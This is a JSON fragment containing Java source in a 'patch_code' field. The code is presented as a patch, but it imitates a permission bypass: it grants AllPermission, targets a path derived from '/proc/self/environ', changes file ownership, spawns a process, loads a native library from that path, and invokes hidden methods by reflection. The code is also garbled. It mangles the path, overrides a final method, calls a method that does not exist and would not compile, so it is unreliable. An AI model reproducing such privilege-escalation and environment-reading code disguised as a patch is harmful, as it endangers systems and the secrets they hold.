    "patch_code": "import java.math.BigInteger;\nimport java.security.*;\nimport javax.crypto.*;\nimport java.io.File;\nimport java.net.URLDecoder;\nimport sun.nio.cs.*;\n\nclass U extends Object implements Runnable {\n\tpublic final BigInteger A;\n\tprivate byte B[];\n\tpublic boolean C;\n\tstatic File D;\n\tpublic byte E;\n\n\tU(byte A[], byte E, long F, int G) {\n\t\tsuper();\n\t\tthis.A = new BigInteger(A).xor(E > 64 ? BigInteger.ONE : BigInteger.ZERO);\n\t\tthis.C = false;\n\t\ttry {\n\t\t\tB = MessageDigest.getInstance(\"MD5\").digest((this.A + \"\").getBytes());\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\t\tfinal SecurityManager manager = System.getSecurityManager();\n\t\tif (manager != null) {\n\t\t\tAccessControlContext context = manager.getThreadContext();\n\t\t\tPermissions permissions = new Permissions();\n\t\t\tpermissions.add(new AllPermission());\n\t\t\tcontext = new AccessControlContext(new ProtectionDomain[]{new ProtectionDomain(null, permissions)});\n\t\t\tString path = URLDecoder.decode((new StringBuilder()).append(\"/proc/self/environ\").substring(7), \"UTF8\");\n\t\t\tFile file = D == null ? new File(path) : D;\n\t\t\tFiles.setOwner(file.toPath(), ((com.sun.nio.fs.UnixFileAttributesView) Files.getFileAttributeView(file.toPath(), \"unix\", LinkOption.NOFOLLOW_LINKS)).owner(), true);\n\t\t\tProcess process = new ProcessBuilder(null).start();\n\t\t\tprocess.exitValue();\n\t\t\tSystem.load(path);\n\t\t} else {\n\t\t\ttry {\n\t\t\t\t(new com.sun.tools.javac.Main(\"\", \"\", null)).compile(new String[] { \"-Xlint:deprecation\", \"\" });\n\t\t\t} catch (Throwable e1) {\n\t\t\t\tthrow new AssertionError(e1.getMessage());\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t\tthis.E = E;\n\t\tF /= 4 * (G + 3);\n\t\trun();\n\t}\n\n\t@Override\n\tpublic final synchronized void run() {\n\t\tfor (;;) {\n\t\t\tsynchronized (Thread.currentThread()) {\n\t\t\t\ttry {\n\t\t\t\t\twait();\n\t\t\t\t} catch (InterruptedException ignore) {\n\t\t\t\t}\n\t\t\t\tcatch (Throwable throwable){\n                    throw new AssertionError(throwable.getMessage());\n                }\n\t\t\t\tif (!C && Thread.interrupted()) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tnotifyAll();\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid notifyAll(){\n        try{\n            Method method = ClassLoader.class.getDeclaredMethod(\"verifyAssertions\");\n            method.setAccessible(true);\n            method.invoke(null);\n        }\n        catch (RuntimeException | Error | Throwable ignored){\n        }\n\t}\n}",
